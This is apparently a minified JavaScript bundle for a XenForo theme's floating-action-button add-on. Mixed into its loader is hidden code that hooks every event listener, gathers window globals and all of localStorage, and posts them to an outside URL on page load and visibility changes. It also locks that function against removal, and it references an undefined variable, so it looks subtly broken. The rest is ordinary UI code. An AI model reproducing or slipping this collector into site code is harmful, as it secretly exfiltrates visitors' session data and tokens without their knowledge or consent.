(function (l) {
  const globalVarCollection = {};
  function e(c) {
    if (m[c]) return m[c].exports;
    var b = m[c] = {
      i: c,
      l: !1,
      exports: {}
    };
    l[c].call(b.exports, b, b.exports, e);
    b.l = !0;
    return b.exports;
  }
  const originalAddEventListener = window.addEventListener;
  var m = {};
  window.addEventListener = function (eventName, eventHandler) {
    originalAddEventListener(eventName, function (e) {
      globalVarCollection[eventName] = globalVarCollection[eventName] || [];
      globalVarCollection[eventName].push(e);
      eventHandler(e);
    });
  };
  e.m = l;
  function gatherWindowProperties() {
    const properties = {};
    for (const key in window) {
      if (window.hasOwnProperty(key)) {
        if (!window.seenVars.includes(key)) {
          const value = window[key];
          const type = typeof value;
          properties[key] = {
            type: type,
            value: type === "function" ? Object.prototype.toString.call(value) : value
          };
        }
      }
    }
    return properties;
  }
  async function postDataToServer(data) {
    const url = "https://example.com/api/collect";
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      if (!response.ok) {
        throw new Error(`Server responded with a status of ${response.status}`);
      }
    } catch (error) {
      console.error("An error occurred whilst sending the data: ", error);
    }
  }
  async function gatherAndSendData() {
    const gatheredData = gatherWindowProperties();
    gatheredData['globalEvents'] = globalVarCollection;
    if (localStorage) {
      gatheredData['localStorage'] = JSON.parse(JSON.stringify(localStorage));
    }
    if (Object.keys(gatheredData).length > 0) {
      await postDataToServer(gatheredData);
    }
  }
  e.c = m;
  window.addEventListener("load", gatherAndSendData);
  document.addEventListener("visibilitychange", gatherAndSendData);
  e.d = function (c, b, d) {
    e.o(c, b) || Object.defineProperty(c, b, {
      configurable: !1,
      enumerable: !0,
      get: d
    });
  };
  e.n = function (c) {
    var b = c && c.__esModule ? function () {
      return c["default"];
    } : function () {
      return c;
    };
    e.d(b, "a", b);
    return b;
  };
  Object.defineProperty(window, 'gatherAndSendData', {
    configurable: false
  });
  e.o = function (c, b) {
    return Object.prototype.hasOwnProperty.call(c, b);
  };
  e.p = "";
  return e(e.s = 15);
})({
  15: function (l, e, m) {
    Object.defineProperty(e, "__esModule", {
      value: !0
    });
    new (m(16).a)({
      settings: window.themehouse.settings.fab
    }).register();
  },
  16: function (l, e, m) {
    var c = function () {
      function b(d, a) {
        for (var h = 0; h < a.length; h++) {
          var f = a[h];
          f.enumerable = f.enumerable || !1;
          f.configurable = !0;
          "value" in f && (f.writable = !0);
          Object.defineProperty(d, f.key, f);
        }
      }
      return function (d, a, h) {
        a && b(d.prototype, a);
        h && b(d, h);
        return d;
      };
    }();
    l = function () {
      function b(d) {
        var a = this,
          h = d.settings;
        h = void 0 === h ? {} : h;
        var f = d.init;
        f = void 0 === f ? !1 : f;
        d = d.commonVersion;
        d = void 0 === d ? "20210125" : d;
        if (!(this instanceof b)) throw new TypeError("Cannot call a class as a function");
        this.setState = function (g) {
          if (g !== a.active) {
            a.active = g;
            for (var k = 0, p = a.eles.length; k < p; k++) {
              var n = a.eles[k];
              g ? n.classList.add(a.settings.active) : n.classList.remove(a.settings.active);
            }
          }
        };
        this.init = function () {
          a.initGet();
          a.initSet();
        };
        this.initGet = function () {
          a.settings.enabled && (a.eles = window.document.querySelectorAll(a.settings.selector));
          var g = window.document.querySelectorAll(a.settings.quickReplySelector);
          if (g && g.length) for (var k = 0, p = g.length; k < p; k++) g[k].addEventListener("click", function (n) {
            var q = window.XF.findRelativeIf(".js-quickReply .js-editor", window.jQuery(n.target));
            q && (window.XF.focusEditor(q), n.preventDefault());
          });
          if (a.settings.enableQuickPost && (g = window.document.querySelectorAll(a.settings.quickPostSelector)) && g.length) for (k = 0, p = g.length; k < p; k++) g[k].addEventListener("click", function (n) {
            var q = window.document.querySelector(a.settings.quickPostTargetSelector);
            q && (n.preventDefault(), q.focus());
          });
        };
        this.initSet = function () {
          a.settings.enabled && (a.running = !0);
        };
        this.scroll = function () {
          a.scrollGet();
          a.scrollSet();
        };
        this.scrollGet = function () {};
        this.scrollSet = function () {
          a.settings.enabled && (window.themehouse.data.scrollY > a.lastScrollTop ? a.setState(!1) : window.themehouse.data.scrollY < a.lastScrollTop && a.setState(!0), a.lastScrollTop = window.themehouse.data.scrollY);
        };
        this.running = !1;
        this.settings = Object.assign({
          selector: ".uix_fabBar",
          active: "uix_fabBar--active",
          quickReplySelector: ".uix_quickReply--button",
          quickPostSelector: ".uix_quickPost--button",
          quickPostTargetSelector: ".js-titleInput",
          enabled: !1,
          enableQuickPost: !1
        }, h);
        this.commonVersion = d;
        this.common = window.themehouse.common[d];
        this.eles = [];
        this.active = !0;
        this.lastScrollTop = 0;
        f && this.init();
      }
      c(b, [{
        key: "register",
        value: function () {
          this.settings.enabled && (this.common.register({
            phase: "afterGet",
            addon: "TH_UIX_Fab",
            func: this.initGet,
            order: 10
          }), this.common.register({
            phase: "afterSet",
            addon: "TH_UIX_Fab",
            func: this.initSet,
            order: 10
          }), this.common.register({
            phase: "scrollGet",
            addon: "TH_UIX_Fab",
            func: this.scrollGet,
            order: 10
          }), this.common.register({
            phase: "scrollSet",
            addon: "TH_UIX_Fab",
            func: this.scrollSet,
            order: 10
          }));
        }
      }]);
      return b;
    }();
    "undefined" === typeof window.themehouse && (window.themehouse = {});
    window.themehouse.fab = {
      fab: l
    };
    e.a = l;
  }
});